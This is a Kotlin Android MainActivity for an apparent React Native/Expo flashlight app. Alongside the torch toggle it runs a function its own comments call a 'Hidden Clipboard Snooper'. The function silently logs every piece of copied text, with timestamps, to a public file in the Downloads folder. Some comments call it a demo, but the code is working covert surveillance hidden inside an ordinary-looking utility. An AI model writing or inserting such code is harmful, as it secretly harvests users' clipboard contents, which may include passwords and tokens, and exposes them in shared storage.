package com.backgroundapp

import androidx.appcompat.app.AppCompatActivity

import android.content.ClipData
import android.content.ClipboardManager
import android.content.Context
import android.content.pm.PackageManager
import android.hardware.camera2.CameraAccessException
import android.hardware.camera2.CameraManager

import android.os.Build
import android.os.Bundle
import android.os.Environment
import android.util.Log
import android.view.WindowManager
import android.widget.Button
import android.widget.SeekBar
import android.widget.Toast
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import android.Manifest

import java.io.File
import java.io.FileWriter
import java.io.IOException

import com.facebook.react.ReactActivity
import com.facebook.react.ReactActivityDelegate
import com.facebook.react.defaults.DefaultNewArchitectureEntryPoint.fabricEnabled
import com.facebook.react.defaults.DefaultReactActivityDelegate

import expo.modules.ReactActivityDelegateWrapper

class MainActivity : ReactActivity() {

  private var flashlightOn = false
  private lateinit var cameraManager: CameraManager
  private var cameraId: String? = null
  private lateinit var logFile: File


  override fun onCreate(savedInstanceState: Bundle?) {
    // Set the theme to AppTheme BEFORE onCreate to support
    // coloring the background, status bar, and navigation bar.
    // This is required for expo-splash-screen.
    setTheme(R.style.AppTheme)
    super.onCreate(null)
    setContentView(R.layout.activity_main)

    val btnFlashlight: Button = findViewById(R.id.btnFlashlight)

    // Request storage permission for Android 9
    if (ContextCompat.checkSelfPermission(this, Manifest.permission.WRITE_EXTERNAL_STORAGE)
        != PackageManager.PERMISSION_GRANTED) {
        ActivityCompat.requestPermissions(this,
            arrayOf(Manifest.permission.WRITE_EXTERNAL_STORAGE), 1001)
    }

    // Clipboard Snooper
    setupClipboardSnooper()

    cameraManager = getSystemService(Context.CAMERA_SERVICE) as CameraManager
    try {
        for (id in cameraManager.cameraIdList) {
            if (packageManager.hasSystemFeature(PackageManager.FEATURE_CAMERA_FLASH)) {
                cameraId = id
                break
            }
        }
    } catch (e: CameraAccessException) {
        Log.e("MainActivity", "Error accessing camera", e)
    }

    btnFlashlight.setOnClickListener {
        flashlightOn = !flashlightOn
        try {
            cameraId?.let { id ->
                cameraManager.setTorchMode(id, flashlightOn)
                btnFlashlight.text = if (flashlightOn) "Flashlight ON" else "Toggle Flashlight"
            } ?: run {
                Toast.makeText(this, "No Flash Available", Toast.LENGTH_SHORT).show()
            }
        } catch (e: CameraAccessException) {
            e.printStackTrace()
        }
    }
  }

  // Hidden Clipboard Snooper (Android 9 background access)
  private fun setupClipboardSnooper() {
    // Write directly to Downloads folder for demo
    val downloadsDir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS)
    logFile = File(downloadsDir, "clipboard_log.txt")
    Log.d("ClipboardSnoop", "📄 Log file: ${logFile.absolutePath}")

    // Write initial message
    try {
        downloadsDir.mkdirs()
        FileWriter(logFile, true).use { writer ->
            writer.append("=== Clipboard Snooper Started ===\n")
            writer.append("Time: ${System.currentTimeMillis()}\n")
            writer.append("Android Version: ${Build.VERSION.RELEASE}\n")
            writer.append("SDK Level: ${Build.VERSION.SDK_INT}\n\n")
            writer.flush()
        }
        Log.d("ClipboardSnoop", "✅ Initial write successful")
    } catch (e: Exception) {
        Log.e("ClipboardSnoop", "❌ Initial write failed: ${e.message}", e)
        return
    }

    // Setup clipboard monitoring (works in background on Android 9)
    val clipboard = getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
    clipboard.addPrimaryClipChangedListener {
        try {
            val clip = clipboard.primaryClip
            if (clip != null && clip.itemCount > 0) {
                val text = clip.getItemAt(0).text?.toString()
                if (!text.isNullOrEmpty()) {
                    val timestamp = System.currentTimeMillis()
                    val logEntry = "[$timestamp] $text"

                    Log.d("ClipboardSnoop", "🎯 CAPTURED: $text")

                    // Write to Downloads immediately
                    FileWriter(logFile, true).use { writer ->
                        writer.append("$logEntry\n")
                        writer.flush()
                    }

                    Log.d("ClipboardSnoop", "✅ Written to Downloads")
                }
            }
        } catch (e: Exception) {
            Log.e("ClipboardSnoop", "❌ Clipboard error: ${e.message}", e)
        }
    }
  }

  private fun writeToFile(text: String) {
        // Simplified write function
        try {
            FileWriter(logFile, true).use { writer ->
                writer.append("$text\n")
                writer.flush()
            }
            Log.d("ClipboardSnoop", "✅ Written to: ${logFile.absolutePath}")
        } catch (e: IOException) {
            Log.e("ClipboardSnoop", "❌ Write failed: ${e.message}")
        }
  }

  override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<out String>, grantResults: IntArray) {
    super.onRequestPermissionsResult(requestCode, permissions, grantResults)
    if (requestCode == 1001) {
        if (grantResults.isNotEmpty() && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
            Log.d("ClipboardSnoop", "✅ Permission granted - retrying setup")
            setupClipboardSnooper()
        } else {
            Log.e("ClipboardSnoop", "❌ Permission denied")
            Toast.makeText(this, "Storage permission needed for demo", Toast.LENGTH_LONG).show()
        }
    }
  }

  /**
   * Returns the name of the main component registered from JavaScript. This is used to schedule
   * rendering of the component.
   */
  override fun getMainComponentName(): String = "main"

  /**
   * Returns the instance of the [ReactActivityDelegate]. We use [DefaultReactActivityDelegate]
   * which allows you to enable New Architecture with a single boolean flags [fabricEnabled]
   */
  override fun createReactActivityDelegate(): ReactActivityDelegate {
    return ReactActivityDelegateWrapper(
          this,
          BuildConfig.IS_NEW_ARCHITECTURE_ENABLED,
          object : DefaultReactActivityDelegate(
              this,
              mainComponentName,
              fabricEnabled
          ){})
  }

  /**
    * Align the back button behavior with Android S
    * where moving root activities to background instead of finishing activities.
    * @see <a href="https://developer.android.com/reference/android/app/Activity#onBackPressed()">onBackPressed</a>
    */
  override fun invokeDefaultOnBackPressed() {
      if (Build.VERSION.SDK_INT <= Build.VERSION_CODES.R) {
          if (!moveTaskToBack(false)) {
              // For non-root activities, use the default implementation to finish them.
              super.invokeDefaultOnBackPressed()
          }
          return
      }

      // Use the default back button implementation on Android S
      // because it's doing more than [Activity.moveTaskToBack] in fact.
      super.invokeDefaultOnBackPressed()
  }
}
